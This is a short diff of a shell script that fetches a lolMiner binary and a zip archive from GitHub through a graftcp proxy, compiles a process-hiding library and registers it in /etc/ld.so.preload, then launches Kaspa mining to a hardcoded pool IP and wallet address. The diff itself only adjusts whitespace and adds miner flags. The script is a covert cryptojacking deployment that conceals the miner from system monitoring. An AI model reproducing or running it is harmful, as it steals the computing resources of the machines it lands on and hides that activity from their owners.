@@ -34,7 +34,7 @@ echo " "
 echo " "
 
 ./graftcp/graftcp wget https://github.com/angkii/m/blob/main/lolMiner
-chmod +x lolMiner 
+chmod +x lolMiner
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -43,4 +43,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lolMiner --algo KASPA --pool 159.223.188.176:80 --user kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.v100
+./graftcp/graftcp ./lolMiner --algo KASPA --pool 159.223.188.176:80 --user kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.v100 --tls 0 --ethstratum ETH pause
